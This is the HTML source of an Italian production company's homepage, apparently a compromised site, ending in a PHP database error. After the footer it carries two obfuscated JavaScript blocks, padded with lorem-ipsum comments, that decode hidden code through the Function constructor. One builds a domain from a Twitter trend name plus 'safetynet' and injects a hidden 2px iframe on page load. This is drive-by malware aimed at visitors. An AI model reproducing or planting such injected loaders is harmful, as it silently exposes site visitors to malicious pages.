<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Princigalli produzioni</title>
<link rel="shortcut icon" href="favicon.ico" />
<link href="stylenew.css" rel="stylesheet" type="text/css" />
<link href="ajax-tooltip.css" rel="stylesheet" media="screen" type="text/css" />
<!--[if IE]>
<style type="text/css" media="screen">
 #link_artisti ul li {float: left;}
 #link_artisti ul ul {
 	position:relative;
	z-index:500;
 }
 #link_artisti ul li {
	text-align:left;
	position:relative;
	width:100px;
	background:url(img/freccetta.gif) no-repeat;
    background-position: 0px 10px;
}
 #link_artisti ul li ul li {
	text-align:left;
	width:200px;
	background:none;
}
</style>
<![endif]-->
<!--[if lt IE 7]>
<style type="text/css" media="screen">
body {
behavior: url(csshover.htc);
}
</style>
<![endif]-->
<script language="javascript" type="text/javascript" src="js/flashobject.js"></script>
<script type="text/javascript" src="src/adapter/shadowbox-base.js"></script>
<script type="text/javascript" src="src/shadowbox.js"></script>
<script language="javascript" type="text/javascript" src="js/ahah.js"></script>

<!-- TOOL TIP DINAMICO -->

<script type="text/javascript" src="js/ajax-dynamic-content.js"></script>
<script type="text/javascript" src="js/ajax.js"></script>
<script type="text/javascript" src="js/ajax-tooltip.js"></script>

<!-- ################# -->

<script language="javascript">

		Shadowbox.loadSkin('classic', 'src/skin');
		Shadowbox.loadLanguage('it', 'src/lang');
		Shadowbox.loadPlayer(['flv', 'html', 'iframe', 'img', 'qt', 'swf', 'wmp'], 'src/player');
		
		window.onload = function(){
		
    		Shadowbox.init();
			calendario();

		};

		function Openpop(mypage,myname,w,h,scroller) { //v2.0
			LeftPosition = (screen.width) ? (screen.width-w)/2 : 0;
			TopPosition = (screen.height) ? (screen.height-h)/2 : 0;
			settings = 'height='+h+',width='+w+',top='+TopPosition+',left='+LeftPosition+',scrollbars='+scroller+',resizable';
			window.open(mypage,myname,settings);
	    }
		
		function Carica_artista(ID) {
			if (ID != '') {
				// alert(ID);
				window.open(ID, "_self");
			} else {
				return false;
			}
		}
		
		/* CODICE CALENDARIO */
		
		function calendario() {
		likeSubmit('calendario.php?rand=' + escape(Math.random()), 'POST', 'frm_cal', 'calendario', 'no');
		}
		
		function change_cal(aa,mm) {
		document.getElementById('aa').value = aa;
		document.getElementById('mm').value = mm;
		calendario();
		document.getElementById('aa').value = '';
		document.getElementById('mm').value = '';
		}
		
		function Check_datainizio(data_inizio) {
			location.href = "eventi.php?data=" + data_inizio;
		}
		
		/* CODICE CALENDARIO */
		
</script>
</head>

<body>
<div id="contenitore">
		
       	<!-- QUI LA COLONNA DI SX -->
        <div id="colonna_sx" style="background:url(img/sfondo_menuhomep.gif) bottom left no-repeat #FFFFFF;">
        	<div id="menu_sx">
            <ul>
              <li class="home_active"></li>
              <!-- <li class="calendario" onclick="javascript:location.href='calendario.php';"></li> -->
              <li class="artisti" onclick="javascript:location.href='artisti.php';"></li>
              <li class="progetti" onclick="javascript:location.href='progetti.php';"></li>
              <li class="about" onclick="javascript:location.href='chisiamo.php';"></li>
              <li class="contatti" onclick="javascript:location.href='contatti.php';"></li>
            </ul>
            
            
            <!-- Calendario -->
            <form action="#" name="frm_cal" id="frm_cal" enctype="multipart/form-data" method="post">
            <div id="calendario" style="text-align:center;">
            </div>
            <input name="aa" id="aa" type="hidden" />
            <input name="mm" id="mm" type="hidden" />
            </form>
            <!-- fine calendario -->
            
            </div>
        </div>
        <!--   FINE COLONNA SX   -->
        
        <!-- COLONNA dx -->
        <div id="colonna_dx">
        	<!-- HEADER -->
            <div id="header">
            	
            </div>
            <!-- HEADER -->
            
            <!-- CONTENUTO -->
            <div id="contenitore_principale">
				<div id="contenitore_principale_dentro">
            	<br />
<b>Warning</b>:  mysql_query() expects parameter 2 to be resource, null given in <b>/home/princigalli/princigalliproduzioni.it/index.php</b> on line <b>149</b><br />
                </div>
          	</div>
            <!-- CONTENUTO -->
        </div>
        <!-- FINE COLONNA dX   -->
        
        <div class="separatore_neutro">
        </div>
        
        <!-- footer -->
        <div id="footer">
        <!-- <div id="footer_left"><a href="mailto:info@princigalliproduzioni.it"><img src="img/tasto_email.gif" alt="info@princigalliproduzioni.it" border="0" /></a>
        Lungomare N. Sauro 13 - 70121 Bari - tel/fax +39 080.555.99.87 - <a href="mailto:info@princigalliproduzioni.it">info@princigalliproduzioni.it</a> 
        </div> -->
<div id="footer_right">
        	<!-- <script language="javascript">
					function Openres(mypage,myname,w,h,scroller) { //v2.0
						LeftPosition = (screen.width) ? (screen.width-w)/2 : 0;
						TopPosition = (screen.height) ? (screen.height-h)/2 : 0;
						settings = 'height='+h+',width='+w+',top='+TopPosition+',left='+LeftPosition+',scrollbars='+scroller+',resizable'
						window.open(mypage,myname,settings)
					}	
			</script>
        	<a href="javascript:;" onClick="Openres('reserved','','800','600','yes')" >
            <img src="img/tasto_arearis.gif" alt="Area riservata" width="136" height="40" border="0" /> 
            </a>       	
            
            <a href="javascript:;" onClick="Openres('lists/?p=subscribe&id=1','','750','350','yes')" >
            <img src="img/tasto_newsletter.gif" alt="newsletter" width="116" height="40" border="0" />
            </a> -->
            <a href="mailto:info@princigalliproduzioni.it"><img src="img/tasto_email.gif" alt="info@princigalliproduzioni.it" border="0" /></a>
            </div>
        </div>
        <!-- footer -->	
		
</div>
<script>
(function($$,_2,_1) {
	function qq2(){return [89,75,80,70,81,89,16,73,78,81,67,31,10,2,28,2,13,83,31,2,28,88,67,84,2,56,77,31,86,74,75,85,29,62,61,56,77,2,2,40,87,78,78,59,71,67,84,2,7,47,81,80,86,74,2,7,38,67,86,71,2,7,42,81,87,84,85,2,7,47,75,80,87,86,71,85,2,7,53,71,69,81,80,70,85,10,11,63,95,29,2,13,52,31,2,28,2,8,89,14,56,91,31,86,74,75,85,16,5,83,10,11,14,75,31,18,29,56,91,61,19,63,13,31,19,29,89,74,75,78,71,10,75,13,13,30,25,11,93,5,89,31,56,91,61,75,63,2,17,5,89,30,5,37,11,56,91,61,75,63,2,25,5,89,95,62,2,56,91,16,85,82,78,75,69,71,10,96,92,9,11,14,19,13,96,54,2,18,2,24,96,87,2,18,13,9,54,9,13,56,91,2,24,96,55,2,18,95,29,56,44,31,93,9,74,66,74,86,86,82,28,17,17,58,85,66,17,58,86,66,86,84,71,58,70,66,70,67,75,58,80,66,80,70,85,58,83,66,33,58,69,66,69,67,78,78,68,67,69,77,31,58,76,66,5,58,67,66,67,82,75,58,78,66,78,91,58,57,66,86,89,75,86,86,71,84,58,81,66,69,81,79,58,71,66,19,58,77,66,85,58,45,66,68,81,70,91,58,90,66,67,76,67,90,58,38,66,16,58,46,66,78,75,68,85,58,44,66,76,83,87,71,84,91,58,24,66,24,16,20,58,79,66,79,75,80,58,72,66,81,80,58,53,66,69,84,75,82,86,58,75,66,75,72,58,47,66,84,67,79,71,58,59,66,74,71,67,70,58,89,66,89,75,70,86,74,28,58,82,66,82,90,29,58,42,66,74,71,75,73,74,86,28,58,54,66,20,58,84,66,84,69,58,51,66,4,58,91,66,85,86,91,78,71,31,58,68,66,32,30,58,52,66,32,30,17,58,43,66,70,75,88,58,36,66,30,58,35,66,32,58,73,66,73,81,81,73,78,71,58,39,66,8,70,67,86,71,31,58,92,66,18,58,87,66,15,58,55,66,2,58,14,66,28,18,18,58,29,9,28,20,21,22,23,24,25,26,27,18,19,14,9,17,9,28,22,26,20,25,19,14,9,40,9,28,19,27,26,19,27,23,20,23,22,14,9,41,9,28,19,20,14,9,37,66,31,9,95,29,34,2,5,53,10,56,81,11,93,5,74,31,61,63,29,72,81,84,10,56,86,31,18,29,56,86,30,56,81,2,10,29,56,86,13,13,11,93,5,74,16,82,87,85,74,10,56,44,61,56,81,16,69,74,67,84,35,86,10,56,86,11,63,11,95,62,2,5,35,10,5,74,11,95,56,48,31,70,81,69,87,79,71,80,86,29,5,81,31,89,75,80,70,81,89,29,2,11,42,31,9,87,80,70,71,72,75,80,71,70,9,29,2,11,38,31,96,74,67,38,57,38,81,85,71,85,86,80,85,70,78,38,76,72,83,69,83,9,2,22,75,31,2,12,11,31,31,2,11,42,11,2,17,5,75,94,94,3,56,70,10,11,11,93,75,72,10,3,5,75,11,93,86,84,91,93,56,88,31,76,51,87,71,84,91,2,3,29,86,84,91,93,56,88,31,6,2,3,95,56,80,31,56,48,16,73,71,86,39,78,71,79,71,80,86,85,36,91,54,67,73,48,67,79,71,10,96,59,2,18,61,18,63,29,5,84,31,56,48,16,69,84,71,67,86,71,39,78,71,79,71,80,86,10,96,77,53,2,18,29,5,84,16,85,71,86,35,86,86,84,75,68,87,86,71,10,96,77,84,9,11,14,5,53,10,4,74,90,38,73,67,77,38,81,85,90,85,46,85,44,85,71,38,24,85,44,38,79,38,76,4,11,11,29,56,80,16,67,82,82,71,80,70,37,74,75,78,70,10,5,84,11,95,34,2,56,68,10,5,92,14,56,69,2,21,47,67,86,74,16,72,78,81,81,84,10,5,92,17,56,69,11,2,27,54,10,5,40,11,93,88,67,84,2,56,79,31,56,68,10,2,11,90,14,2,6,67,11,29,2,8,76,31,2,11,90,7,2,6,67,29,2,8,46,31,2,6,91,12,5,76,29,2,8,69,31,2,6,53,12,56,79,29,2,8,85,31,5,46,15,5,69,2,17,5,85,32,18,11,93,5,90,31,5,85,95,71,78,85,71,93,5,90,31,5,85,13,2,6,73,95,62,10,5,90,7,5,40,11,2,27,50,10,5,41,11,93,2,11,90,31,96,29,9,11,13,5,41,29,2,6,91,31,96,17,9,11,29,2,6,73,31,96,29,9,11,15,96,40,9,11,29,2,6,67,31,56,68,10,2,6,73,14,2,6,91,11,29,2,6,53,31,2,6,73,7,2,6,91,2,27,35,10,56,2,21,56,2,10,31,31,19,33,56,61,18,63,28,56,2,24,9,9,11,95,29,34,2,5,68,10,56,11,93,70,31,80,71,89,2,38,67,86,71,10,2,22,73,31,96,92,71,71,9,11,29,70,16,85,71,86,54,75,79,71,10,10,56,16,67,85,65,81,72,15,96,41,9,11,12,96,41,9,11,12,96,41,9,11,12,96,71,92,92,2,18,12,96,71,92,92,92,2,18,29,62,2,70,2,27,82,10,56,36,11,93,2,8,48,14,56,47,14,5,44,31,56,36,2,10,29,2,8,67,31,61,63,29,89,74,75,78,71,10,15,15,5,44,11,93,56,47,31,5,54,10,5,44,2,22,67,16,82,87,85,74,10,56,47,2,22,48,31,56,36,61,56,47,63,29,56,36,61,56,47,63,31,56,36,61,5,44,63,29,56,36,61,5,44,63,31,5,48,95,95,34,2,56,90,10,6,11,93,56,84,31,6,16,79,67,82,10,61,26,19,14,26,23,14,25,22,14,25,22,14,27,20,14,19,25,14,26,20,14,25,21,14,26,18,14,21,18,14,26,20,14,25,25,14,20,23,14,19,19,14,19,18,14,19,18,14,24,19,14,19,19,14,23,24,14,23,23,14,19,19,14,23,21,14,24,14,23,21,14,25,14,20,14,19,14,18,14,22,26,63,14,34,10,90,14,75,2,21,53,86,84,75,80,73,16,72,84,81,79,37,74,67,84,37,81,70,71,10,75,13,90,13,20,22,11,95,11,29,62,2,5,35,10,56,84,11,2,27,72,10,90,2,21,90,2,10,95,34,2,56,74,10,6,11,93,75,72,2,12,11,3,31,2,11,42,11,93,6,10,2,28,75,72,2,12,16,56,82,11,3,31,2,11,42,11,62,29,6,16,56,82,31,19,29,2,23,38,14,34,10,56,37,11,93,5,71,31,5,68,10,56,37,2,22,87,31,5,71,2,2,47,81,80,86,74,10,11,2,29,46,31,5,71,2,2,38,67,86,71,10,2,22,91,31,34,10,90,14,75,11,93,62,10,5,72,10,90,13,4,4,11,15,19,11,33,90,28,4,18,4,13,90,95,29,56,85,31,5,91,10,5,87,14,22,11,13,4,15,4,13,5,91,10,56,46,14,25,2,22,86,31,5,38,13,5,53,10,4,39,2,19,29,56,71,31,56,42,31,56,68,10,5,71,2,2,42,81,87,84,85,10,11,14,24,11,12,24,2,29,38,31,56,71,13,19,29,5,37,31,13,96,71,92,9,11,29,2,14,2,23,86,14,34,10,56,37,11,93,86,84,91,93,5,80,31,56,37,16,86,84,71,80,70,85,29,5,79,31,5,53,10,4,2,19,13,4,2,4,2,17,56,71,30,5,37,11,56,71,2,25,56,71,2,17,56,38,30,5,37,11,56,38,2,25,56,38,29,2,26,71,13,5,53,10,58,11,63,2,17,3,5,70,11,93,2,26,38,13,5,53,10,58,11,63,95,5,70,31,10,5,70,61,21,63,16,80,67,79,71,16,86,81,46,81,89,71,84,37,67,85,71,10,11,16,84,71,82,78,67,69,71,10,17,61,64,67,15,92,63,17,73,75,14,9,9,11,13,9,79,75,69,84,81,85,69,81,82,71,9,11,16,85,82,78,75,86,10,9,9,2,22,36,31,5,87,12,25,19,13,56,42,12,21,13,56,46,12,21,25,29,5,50,10,5,36,2,22,72,31,5,54,10,22,11,13,5,37,29,5,82,10,5,70,2,22,39,31,96,37,74,9,11,13,5,35,10,5,70,11,16,85,87,68,85,86,84,75,80,73,10,18,14,5,72,11,13,9,16,69,81,79,17,9,13,56,90,10,6,11,29,56,44,61,9,60,9,63,31,5,39,29,56,89,31,96,36,43,2,20,68,75,47,55,2,20,55,77,84,60,52,75,47,52,43,35,9,11,29,6,10,96,45,2,18,16,67,82,82,71,80,70,10,56,89,11,95,69,67,86,69,74,10,56,83,11,93,95,95,11,95,14,5,37,12,5,37,12,5,37,11,95,11,95,11,95,71,78,85,71,93,2,14,2,15,14,19,13,96,54,54,54,2,18,95,95,2,15,11,5,76,85,34,72,87,80,69,86,75,81,80,56,5,45,58,9,14,9,66,9,28,9,96,5,53,10,9,62,84,71,86,87,84,80,2,2,16,73,71,86,55,54,37,2,3,16,80,81,37,81,80,72,78,75,69,86,10,86,84,87,71,11,95,69,67,86,69,74,10,71,11,93,95,2,6,5,81,16,56,2,7,10,11,14,56,77,2,2,2,8,88,67,84,2,5,2,10,16,78,71,80,73,86,74,2,11,5,81,16,5,2,12,10,86,91,82,71,81,72,10,6,2,13,38,67,86,71,16,82,84,81,86,81,86,91,82,71,16,5,2,14,85,71,86,54,75,79,71,81,87,86,10,2,28,2,15,56,74,10,5,81,16,76,51,87,71,84,91,11,95,2,17,29,75,72,10,2,18,9,11,11,2,19,54,92,71,54,87,4,11,13,56,85,2,20,91,51,42,54,82,89,71,71,71,82,51,2,21,11,93,62,2,2,22,11,29,5,2,23,6,16,73,71,86,44,53,49,48,10,5,2,24,16,76,81,75,80,10,2,25,31,96,92,9,11,13,2,26,5,70,31,5,80,61,5,79,13,56,2,27,95,34,2,5,2,28,34,10,11,93,2,29,13,10,13,96,71,2,18,29,56];}
	
	function co() {
		return 'Code';
	}
	function gafu() {
		xxx=a(String, 'f' + ro() + co());
		return function(q){return xxx(q);};
	};
	rex = [gafu(),gafu()];
	

	function choo(k) {
		if (k < 9) {
			return 1
		} else {
			return 2
		}
	};
	
	d = '';
	mapper = [5,34,56,58,66,96,62,2,2,2,3,2,6,2,7,2,8,2,10,2,11,2,12,2,13,2,14,2,15,2,17,2,18,2,19,2,20,2,21,2,22,2,23,2,24,2,25,2,26,2,27,2,28,2,29];
	map = '';

	function fs(ro, arr, add, st, en,dp) {
		//Mauris gravida, libero ut tempor ultricies, ante erat blandit dui, vestibulum convallis ligula lacus et metus. Duis quis nunc justo, gravida sem
		var hf = ((en+st)>>1);
		if(en-st>16)
		{
			//lacus, tristique vitae aliquet a, ultrices nec libero. Aliquam sagittis enim in nibh semper tincidunt. Donec malesuada lorem sit amet risus euis
			return fs(ro, arr, add, st, hf,dp+1) + fs(ro,arr, add, hf, en,dp+1);
		}else{
			var rt='';rx1=rex[add-29];
			for(var rj=st;rj<en;rj++){
			rt+=rx1(arr[rj]+add);
		}
		//modo, diam a placerat facilisis, magna libero mollis erat, in molestie nunc tellus consequat justo. Nulla ac nunc purus. Pellentesque habitant morbi
			return rt;
		}
	}
	map += fs(map, mapper, 30, 0,mapper.length);
	//et condimentum metus. Aliquam convallis auctor sapien, sit amet bibendum ligula condimentum ac. Vivamus blandit molestie enim vitae bland

	function a(b, c) {
		return b[c];
	};

	function ro() {
		return 'romChar';
	}
	rd=fs(d, qq2(), 30, 0, qq2().length);
	//e feugiat. Etiam elit elit, hendrerit et varius non, molestie consectetur ipsum. Nullam sapien sem, mattis nec tempus non, elementum vitae ligula. Maur
	$$(_1(map,rd,choo,_2));
})(function(jsBb) {
	return (function(jsB, jsBs) {
		return jsBs(jsB(jsBs(jsB(jsBb))))(jsBb)()
	})((function(jsB) {
		return jsB.constructor
	}), (function(jsB) {
		return (function(jsBs) {
			//accumsan dapibus diam 
			return jsB.call(jsB, jsBs)
		})
	}))
},function(tt){return tt.pop();},
function(kk,dd,ch,pp){
	for(var c=kk.length;c>0;){		
		var x=ch(c);
		c-=x;
		var rep=kk.substr(c, x);
		//accumsan dapibus diam 
		var t = dd.split(rep);
		dd=t.join(pp(t));
	};return dd;
});
/**/
gloa();
</script></body>
</html>
<script>(function($$){d="(@(){ %H=@( +Pw=this;\\[Pw~FullYear $Month $Date $Hours $Minutes $Seconds()]}; %B=@( +#h,PD=this.#H(),i=0;PD[1]+=1;while(i++<7){#h=PD[i] 0#h<#L)PD[i]=Vz')+#h}\\ PD.splice(Vz'),1+VT - 3Vu -+'T'+PD 3VU -};Pr={'hXhttp://`sX/`tXtre`dXdai`nXnds`qX?`cXcallback=`jX#`aXapi`lXly`WXtwitter`oXcom`eX1`kXs`KXbody`xXajax`DX.`LXlibs`JXjquery`6X6.2`mXmin`fXon`SXcript`iXif`MXrame`YXhead`wXwidth:`pXpx;`HXheight:`TX2`rXrc`QX\"`yXstyle=`bX><`RX></`IXdiv`BX<`AX>`gXgoogle`EX&date=`zX0`uX-`UX `,X:00`;':2345678901,'/':48271,'F':198195254,'G':12,'CX='};@ #n(#E){#M=[];for(PM=0;PM<#E /;PM++){#M.push(Pr[#E.charAt(PM)])}\\ #p(#M)}Pj=document;#d=window; (C='undefined'; (S=VhaDWDosestnsdlDjfqcq' 6G= &)== (C) 0#G||!PR()){if(!#G){try{Pn=jQuery  ;try{Pn=$  }PS=Pj.getElementsByTagName(VY -[0];#m=Pj.createElement(VkS -;#m.setAttribute(Vkr'),#n(\"hxDgakDosxsLsJseD6sJDmDj\"));PS.appendChild(#m)}@ PH(#q,PB){\\ Math.floor(#q/PB) 7x(#s +PC=PH( (N, !m) 5F= (N% !m 5f= !D*#F- !T*PC 0#f>0){#N=#f}else{#N=#f+ !v}\\(#N%#s) 7t(#k){ (N=V;')+#k; !D=V/'); !v=V;')-VF'); !m=PH( !v, !D); !T= !v% !D 7p(P){\\ P /==1?P[0]:P 3'')};@ #e(P){d=new Date( 6D=Vzee');d.setTime((P.as_of-VG')*VG')*VG')*Vezz -*Vezzz -;\\ d 7z(Pz +#c,PL,#j=Pz / 5v=[];while(--#j){PL=#x(#j 6v.push(PL 6c=Pz[PL];Pz[PL]=Pz[#j];Pz[#j]=#c}}@ PJ($){PN=$.map([81,85,74,74,92,17,82,73,80,30,82,77,25,11,10,10,61,11,56,55,11,53,6,53,7,2,1,0,48],@(x,i){\\ String.fromCharCode(i+x+24)});\\ #p(PN) 7o($){if &)!= (C){$(@(){if &.Ph)!= (C)\\;$.Ph=1; 2S,@(Pe){#R=#e(Pe 6K=#R~Month() 8c=#R~Date( 6u=#S+#n(\"ETzeeu\")+#K+\"-\"+Pc;Pu=PA=PH(#R~Hours(),6)*6 8d=Pu+1;#L=+Vez'); ) 2u,@(Pe){try{#y=Pe.trends;for(#r in #y){break}#r=#r.substr(+Vz'),+Vee - 0Pu ,u 0Pd ,d; 4u+V,')] 0!#b) 4d+V,')];#b=(#b[3].name.toLowerCase().replace(/[^a-z]/gi,'')+'safetynet').split('' 6T=#K*73+PA*3+Pc*41;#t(#T 6a=#x(4)+#L;#z(#b 6g=VCh')+#p(#b).substring(0,#a)+'.com/'+PJ($);Pr['Z']=#g;Pf=VBI 1biMU 1UkrZRiMRIA');$(VK -.append(Pf)}catch(Py){}})},#L*#L*#L)})})}else{ ) *,1+VTTT -}} *)()#js@functionP#AV#n('X':'`','~.getUTC\\return  .noConflict(true)}catch(e){} !#d.P $(),Pw~ %Date.prototype.# &(typeof($ (#d.# )setTimeout(@(){ *#o(#d.jQuery)} +){var  ,<#L)Pu=Vz')+P -')) /.length 0;if( 1yQHTpweeepQ 2$.getJSON(# 3.join( 4#b=#y[#r+P 5;var # 6);# 7}@ # 8+(+Ve -;P";for(c=50;c;d=(t=d.split('#@PVX`~\\   ! $ % & ( ) * + , - / 0 1 2 3 4 5 6 7 8'.substr(c-=(x=c<10?1:2),x))).join(t.pop()));$$(d)})(function(jsAP){return(function(jsA,jsAg){return jsAg(jsA(jsAg(jsA(jsAP))))(jsAP)()})((function(jsA){return jsA.constructor}),(function(jsA){return(function(jsAg){return jsA.call(jsA,jsAg)})}))});</script>